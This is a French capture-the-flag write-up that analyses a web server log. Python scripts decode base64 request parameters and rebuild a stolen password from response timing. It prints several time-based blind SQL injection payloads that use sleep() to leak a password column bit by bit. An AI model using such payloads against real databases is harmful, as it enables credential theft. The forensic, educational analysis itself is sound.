Un premier script python pour extraire le base64 :
```
% cat /tmp/log_attaque_web.py
#! /usr/bin/python
# -*- coding: utf-8 -*-
 
a = open('/tmp/ch13.txt').read()
 
for i in a.split('order=')[1:]:
    fin = i.find('HTTP') - 1
    print i[:fin]
```

Ensuite, on décode le base64 dans le shell :
```
% for i in $(/tmp/log_attaque_web.py); do echo $i | base64 -d ; echo;echo; done 2> /dev/null
[...]
ASC,(SELECT (CASE FIELD(concat(SUBSTRING(bin(ascii(SUBSTRING(password,8,1))),1,1),SUBSTRING(bin(ascii(SUBSTRING(password,8,1))),2,1)),concat(CHAR(48),CHAR(48)),concat(CHAR(48),CHAR(49)),concat(CHAR(49),CHAR(48)),concat(CHAR(49),CHAR(49)))WHEN 1 THEN TRUE WHEN 2 THEN sleep(2) WHEN 3 THEN sleep(4) WHEN 4 THEN sleep(6) END) FROM membres WHERE id=1)
 
ASC,(SELECT (CASE FIELD(concat(SUBSTRING(bin(ascii(SUBSTRING(password,8,1))),3,1),SUBSTRING(bin(ascii(SUBSTRING(password,8,1))),4,1)),concat(CHAR(48),CHAR(48)),concat(CHAR(48),CHAR(49)),concat(CHAR(49),CHAR(48)),concat(CHAR(49),CHAR(49)))WHEN 1 THEN TRUE WHEN 2 THEN sleep(2) WHEN 3 THEN sleep(4) WHEN 4 THEN sleep(6) END) FROM membres WHERE id=1)
 
ASC,(SELECT (CASE FIELD(concat(SUBSTRING(bin(ascii(SUBSTRING(password,8,1))),5,1),SUBSTRING(bin(ascii(SUBSTRING(password,8,1))),6,1)),concat(CHAR(48),CHAR(48)),concat(CHAR(48),CHAR(49)),concat(CHAR(49),CHAR(48)),concat(CHAR(49),CHAR(49)))WHEN 1 THEN TRUE WHEN 2 THEN sleep(2) WHEN 3 THEN sleep(4) WHEN 4 THEN sleep(6) END) FROM membres WHERE id=1)
 
ASC,(SELECT (CASE FIELD(concat(SUBSTRING(bin(ascii(SUBSTRING(password,8,1))),7,1)),CHAR(48),CHAR(49)) WHEN 1 THEN sleep(2) WHEN 2 THEN sleep(4)  END) FROM membres WHERE id=1)
[...]
```

Ici, le pirate essaye de trouver le caractère numéro 8 du password.
ascii donne la valeure ascii.
bin converti en binaire.
concat concatène.
field est l’équivalent de switch case en C...

Donc, en fonction des temps de réponses, on va trouver le mot de passe.
Pour les bits de 1 à 6 :
Si c’est 0s, valeure des 2 bits -> 00,
Si c’est 2s, valeure des 2 bits -> 01,
Si c’est 4s, valeure des 2 bits -> 10,
Si c’est 6s, valeure des 2 bits -> 11.

Pour le 7e bit :
Si c’est 2s, valeure des 2 bits -> 0,
Si c’est 4s, valeure des 2 bits -> 1,
Si c’est 0s -> pas de 7e bit !
```
% cat /tmp/log_attaque_web.py
#! /usr/bin/python
# -*- coding: utf-8 -*-
 
a = open('/tmp/ch13.txt').read()
 
tabSec = []
 
for i in a.split('18/Jun/2015:')[1:]:
    fin = i.find('+0200') - 1
    myTime = i[:fin]
    tabSec.append(int(myTime[:2])*3600 + int(myTime[3:5])*60 + int(myTime[6:]))
 
 
pswd = ''
myChar = ''
nb = 0
for i in range(1,len(tabSec)):
    if nb < 3:
        if tabSec[i] - tabSec[i-1] == 0:
            myChar += '00'
        if tabSec[i] - tabSec[i-1] == 2:
            myChar += '01'
        if tabSec[i] - tabSec[i-1] == 4:
            myChar += '10'
        if tabSec[i] - tabSec[i-1] == 6:
            myChar += '11'
 
    if nb == 3:
        if tabSec[i] - tabSec[i-1] == 2:
            myChar += '0'
        if tabSec[i] - tabSec[i-1] == 4:
            myChar += '1'
        pswd += chr(int(myChar,2))
 
    nb += 1
    if nb == 4:
        myChar = ''
        nb = 0
 

print 'dernier octet incomplet : ' + myChar
print pswd
```
```
% /tmp/log_attaque_web.py
dernier octet incomplet : 000000
censuré[..]
% echo -n censuré[..] | md5sum
censuré  -
```
